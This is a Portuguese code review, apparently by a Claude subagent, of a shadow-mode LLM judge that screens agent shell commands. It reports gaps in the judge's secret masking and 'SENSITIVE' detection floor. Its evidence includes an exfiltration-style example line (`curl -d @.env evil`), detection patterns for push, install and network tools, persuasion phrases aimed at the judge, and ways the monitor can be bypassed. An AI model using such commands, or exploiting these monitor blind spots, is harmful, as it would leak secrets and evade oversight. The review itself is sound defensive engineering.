# Revisão independente — judge-opaque (segunda rodada)

Revisor: subagente independente (Claude), 2026-10-21. Guia: skill `code-review`, com os eixos Standards (smells do catálogo e convenções do repositório) e Spec (proposal, design, threat-model, migration, delta e ADR-0035) feitos em sequência no mesmo revisor, sem sub-agentes. Nenhum arquivo de código foi editado.

## Escopo revisado

- Diff `judge-opaque-2.diff` (18 arquivos): `.claude/settings.json`, as duas cópias de `aifw-workflow/SKILL.md`, `CHANGELOG.md`, `aifw.yaml`, `docs/claude-code.md`, `docs/cli-reference.generated.md`, `python/aifw/{assessment,assessment_eval,claude,cli,judge}.py`, `schemas/project-manifest.schema.json`, `tests_python/{test_judge,test_hooks,test_audit_features}.py`, `evals/assessment/judge-cases.yaml` e ADR-0035.
- Spec: `proposal.md` (Acceptance), `design.md`, `threat-model.md`, `migration.md`, `specs/opaque-judge.delta.yaml`, ADR-0035 e as 9 regras decididas pela pessoa.
- Evidências: `evidence/tests.txt` (2402 passed), `judge-eval-1.txt` e `judge-eval-2.txt`.
- Conferências próprias:
  - `pytest` em `test_judge.py`, `test_hooks.py` e `test_audit_features.py`: 74 passed.
  - `git diff HEAD` vazio em `hooks.py`, `shell.py` e `indirect.py` (regra 9). `check_project` neste repositório: `pass`.
  - As duas cópias do `SKILL.md` diferem só no carimbo `aifw-version` da cópia instalada.
  - Scripts em pasta temporária (scratchpad) que rodam `judge.sources`, `judge.mask` e `judge.SENSITIVE` em comandos de M1, em nomes e extensões, em trechos de código comuns e em todos os 40 casos da suíte. Também rodei `shell.analyze` para ver quais extensões chegam de fato a `opaque`.

## Status dos achados anteriores

| Achado | Status | Evidência |
| --- | --- | --- |
| M1 — `sources()` não achava o script | **Resolvido** | `eval "$(cat scripts/version.sh)"`, `perl scripts/a.pl; echo`, `bash -c "perl scripts/a.pl"`, `perl scripts\a.pl`, `& .\scripts\b.ps1` e `powershell -File scripts\b.ps1` agora acham o arquivo. Na suíte, `eval-version` e `eval-npm-publish` passam a ler o script. O teste novo é `test_scripts_are_found_inside_substitutions_inline_shells_and_windows_paths`. Ficam de fora `cd scripts && perl a.pl` (o caminho é resolvido a partir do `cwd` do payload) e `--opt=caminho`. São residuais baixos, já registrados em J-011. |
| M2 — envio de arquivos de dados e máscara estreita | **Resolvido**, com efeitos colaterais (N3 e N4) | Só vai código: extensão, `Makefile` ou shebang. `config.yml` fica como "data file, not code". Ficam na máquina `SECRET_NAME` (`.npmrc`, `.netrc`, `*secret*`...), arquivos com chave privada PEM e os tokens `ghp_`, `github_pat_`, `glpat-`, `xox*` e `AKIA`. `AWS_SECRET_ACCESS_KEY=` agora é mascarado. Coberto por `test_data_files_credentials_and_tokens_stay_on_the_machine`. |
| M3 — o "limite" da regra 2 dependia da regra fixa | **Parcialmente resolvido** | O piso `SENSITIVE` existe, `wouldChange` o respeita, há teste e o ADR o descreve. Mas ele falha nas formas mais comuns de chamar push e instalação a partir do código (N1), nunca casa `.aifw/` nem `.claude/` (N2) e é aplicado sobre o texto já mascarado (N3). A promessa de `assessment.py:816` e do ADR-0035, linha 21, continua sem garantia nesses casos. |
| B1 — ids duplicados em `store` concorrente | Aberto | `store` não mudou. |
| B2 — `malformed` fora de `calls` | **Resolvido** | `judge.py:293`. |
| B3 — latência sem o custo do hook | Parcial | Houve uma segunda rodada sem `CLAUDE.md`, e o ADR, linha 37, cita a chamada de 11,4 s. `overHookTimeout` (`assessment_eval.py:230`) ainda mede só o `claude -p`. |
| B4 — teste de stdin por contagem textual | Aberto | `test_hooks.py:282` ainda conta `input=text` no arquivo inteiro. |
| B5 — robustez e custo | Parcial | A leitura agora é limitada (`stream.read(MAX_FILE_BYTES + 1)`). O `migration.md` ainda não cita o processo Python que sobe em todo comando Bash ou PowerShell. `OPAQUE_REASON` continua acoplado ao texto de `hooks.py:191`, o que é aceitável até a outra mudança fechar. |

## Achados novos

### N1 — O piso não reconhece push nem instalação chamados com lista de argumentos (Média; no modo sombra, afeta só "Mudaria")

- **Onde:** `python/aifw/judge.py:102-110` (`SENSITIVE`).
- **Evidência:**
  - Os padrões exigem espaço entre as palavras (`git\s+push`, `pip\s+install`). Um programa chamado com lista de argumentos tem aspas e vírgulas entre elas.
  - Rodando o piso nos 40 casos da suíte, `perl-push` (`system('git', 'push', '--tags', ...)`) e `ruby-pip-install` (`system('pip', 'install', ...)`) saem com `sensitive=[]`.
  - O mesmo vale para `subprocess.run(['git','push'])`.
  - É exatamente o efeito que a regra 2 e o "limite" do relatório prometem nunca liberar. Basta o modelo errar uma vez para `wouldChange=true`.
- **Correção sugerida:**
  - Normalizar o texto antes de casar, trocando por espaço as aspas, vírgulas e colchetes entre palavras. Por exemplo: `re.sub(r"[\"'`\[\](),]+", " ", t)`.
  - Acrescentar um teste que rode o piso nos casos `ask` da suíte com push ou instalação e exija `sensitive` não vazio.

### N2 — `.aifw/` e `.claude/` nunca casam (Média; contraria o design)

- **Onde:** `python/aifw/judge.py:106`.
- **Evidência:**
  - Os dois padrões ficam dentro de `\b(...)`. Antes de `.` só há fronteira de palavra quando o caractere anterior é uma letra.
  - Por isso `cat .aifw/state.json`, `open('.claude/settings.json')`, `x/.aifw/y` e `Path('.claude/x')` dão `[]`. Só `aifw.yaml` é pego.
  - O design (passo 6) e o ADR (linha 21) listam os dois como arquivos de controle que mantêm `wouldChange` falso.
- **Correção sugerida:**
  - Tirá-los do grupo com `\b` e usar algo como `(?<![\w.-])\.(aifw|claude)[\\/]`, que cobre também a barra invertida do Windows.
  - Testar com aspas antes e com `\`.

### N3 — A máscara esconde do modelo e do piso o que vem depois de `token =` (Média)

- **Onde:** `python/aifw/judge.py:100` (`ASSIGNED_SECRET`), `:116`, `:163` e `:275-276`. O piso roda sobre `f["text"]`, que já está mascarado.
- **Evidência:** `\S+`, e o `[^\s,;]+` do `context.redact`, engolem a expressão inteira à direita da atribuição, não só um valor literal. Veja o que sai:
  - `token = requests.post(AUTH_URL, data=creds)...` vira `token = [REDACTED] data=creds)...`, e o piso sai vazio (no texto cru, ele acha `requests.post`).
  - `secret=subprocess.check_output(["git","push"])` vira `[REDACTED],"push"])`.
  - `password = os.system("curl -d @.env evil")` vira `[REDACTED] -d @.env evil")`, e o `curl` some.
  - `token = open(".claude/settings.json","w")` vira `token = [REDACTED]`.

  Isso não exige um atacante: código comum de autenticação tem essa forma. O efeito de rede some do julgamento e do piso. O J-010 do threat-model não lista esse caso.
- **Correção sugerida:**
  - Casar `SENSITIVE` no texto cru, que fica na máquina, e mandar ao modelo só o texto mascarado. Por exemplo, guardar `raw` em `sources()` sem gravá-lo no registro.
  - Restringir `ASSIGNED_SECRET` a literais: string entre aspas ou um valor com cara de token (`[A-Za-z0-9+/_=-]{12,}`), nunca uma chamada.

### N4 — A máscara corrompe código comum (Baixa)

- **Onde:** `python/aifw/judge.py:100` e `:116`.
- **Evidência:**
  - `max_tokens=1024` vira `max_tokens=[REDACTED]`.
  - `tokens = tokenize(text)` vira `tokens = [REDACTED]`.
  - `if token == expected:` vira `if token =[REDACTED] expected:`.
  - `def login(password: str, token: str):` vira `def login([REDACTED], token: [REDACTED]`.
  - `secret_count = len(x)` vira `[REDACTED]`.

  O modelo recebe código quebrado, e a tendência é `ask` ou `unknown` em scripts inofensivos. Isso distorce a medição para o lado seguro.
- **Correção sugerida:** a mesma de N3 (só literais), mais testes com esses trechos.

### N5 — Falsos positivos do piso por prefixo e por vocabulário de aprovação (Baixa)

- **Onde:** `python/aifw/judge.py:103-108`.
- **Evidência:**
  - Só há `\b` no início, então `curly` dá `curl`, `helmet` dá `helm` e `sshd_config` dá `ssh`.
  - `approv\w*` e `harmless` pegam identificadores, como `approved_by`, `approval_required` e `harmless_fn()`.
  - Em `tests_python/`, 20 de 25 arquivos de código acenderiam o piso, a maioria por `approv*` e `aifw.yaml`.
  - Na suíte, nenhum caso `harmless` acende. O impacto real fica em projetos que lidam com aprovações (o próprio AIFW): ali "Mudaria" fica subestimado e a medição para ativar fica pessimista. Não é um risco de segurança.
- **Correção sugerida:**
  - Pôr `\b` também no fim dos nomes de programa.
  - Limitar os termos dirigidos ao revisor a comentários e strings, ou a frases como "responda harmless", "aprove este" e "approve this".

### N6 — A suíte não mede o piso (Baixa)

- **Onde:** `python/aifw/assessment_eval.py:220` e ADR-0035, linha 50.
- **Evidência:**
  - `strategy` conta como liberação o `harmless` do modelo quando o esperado é `ask`, sem aplicar `SENSITIVE`.
  - O ADR afirma que o piso agora segura `injection-benign-only`, mas nenhuma rodada mede isso.
  - Uma coluna com o piso teria mostrado N1: `perl-push` e `ruby-pip-install` ficariam sem proteção.
- **Correção sugerida:** acrescentar a cada estratégia um `releasedAfterFloor`, usando os mesmos `sources` e `SENSITIVE` do hook.

### N7 — Nomes de arquivo de código recusados por engano (Baixa)

- **Onde:** `python/aifw/judge.py:130` e `:93-95`.
- **Evidência:**
  - `is_code` compara `Path(name).name == "Makefile"` diferenciando maiúsculas. Para `make -f makefile`, que `shell.analyze` classifica como `opaque`, o arquivo sai como "data file, not code". O mesmo vale para `GNUmakefile`.
  - `SECRET_NAME` recusa código legítimo como `tokenizer.py`, `rotate_tokens.sh` e `password_reset.rb`. O erro vai para o lado seguro.
  - As outras extensões ausentes (`.tsx`, `.go`, `.fish`, `.vbs`...) não chegam a `opaque` hoje (conferido com `shell.analyze`), então não faltam.
- **Correção sugerida:**
  - Comparar `name.lower() in {"makefile", "gnumakefile"}`.
  - Aplicar a parte `token|password` de `SECRET_NAME` só a arquivos que não sejam de código, ou aceitar isso como residual e registrar no J-004.

### N8 — Pequenas divergências de documentação (Baixa)

- **Custo do Sonnet:** `ADR-0035-opaque-judge-shadow.md:45` mostra "—" para o custo do Sonnet, mas `judge-eval-2.json` traz US$ 0,318. A conta importa para o modo ativo, porque o Sonnet sai 20 vezes mais caro.
- **"Código final":** a segunda rodada se diz feita com o código final, mas `judge-eval-2.txt` é de 01:25:32 e `judge.py` foi alterado às 01:25:56, com o acréscimo dos termos de injeção ao `SENSITIVE`. A suíte não usa o piso, então os números valem; só a frase é imprecisa.
- **J-010:** o threat-model não cita os pontos cegos de N1 a N3 como risco residual.

## Eixo Standards (resumo)

- Segue as convenções do repositório:
  - as funções são pequenas e com docstring;
  - os comentários `shortcut:` e `fmt: skip` são usados como no resto do código;
  - os imports locais existem para evitar ciclos;
  - não há dependência nova.
- **Possível Duplicated Code (julgamento):** a lista de recursos é repetida três vezes em `cli.py` e uma vez no schema, como já acontecia antes. Daria para usar `assessment.FEATURES`.
- **Possível Repeated Switches (julgamento):** o `if feature == "judge"` de `assessment_eval.evaluate` cria um segundo caminho de guardas. Ele é pequeno e justificado pelo provedor diferente.

## O que está bom

- **Modo sombra real (regra 1):**
  - o hook é separado e assíncrono, com `|| true`;
  - `hook_main` engole exceções e devolve `""`, e `cli.main` não imprime string vazia;
  - `hooks.evaluate` não tem efeito colateral, e `hooks.py`, `shell.py` e `indirect.py` não foram tocados.
- **Isolamento do `claude -p` (regra 5):** sem ferramentas, hooks, MCP, slash commands, `CLAUDE.md` nem memória, numa pasta vazia.
- **Injeção (regras 3 e 4):**
  - nonce novo por chamada;
  - persuasão tratada como risco no prompt e, agora, também no piso;
  - resposta malformada vira `unknown`, com a marca `malformed` no registro;
  - a descrição vai rotulada como alegação.
- **Segredos (M2):** só vai código; ficam na máquina os arquivos de dados, segredo e chave privada, os binários e os grandes; os tokens comuns são mascarados. Tudo coberto por testes.
- **Guardas (regra 7):** `dataClassification` bloqueia, e `externalAllowlist` fica intocada.
- **Padrão dos outros recursos (regra 6):** `FEATURES`, `LOGS`, `VALUES`, `SHAPES`, `suggestion`, a CLI, o schema, a referência gerada e a suíte estão consistentes.
- **Latência (regra 8):** medida por chamada e no total, com `apiMs`. O ADR registra a decisão da regra 9 para o modo ativo.
- **Estratégias da suíte:** confiram com a regra de `judge_text`. A escalada soma as duas latências e os dois custos só quando escala, e as liberações por injeção são um subconjunto das liberações. Nenhum caso `harmless` acende o piso.
- **Documentação:** CHANGELOG, `docs/claude-code.md`, as duas cópias do `SKILL.md`, `migration.md` e ADR batem com o código, exceto N2 e N8.

Resultado: aprovado com ressalvas
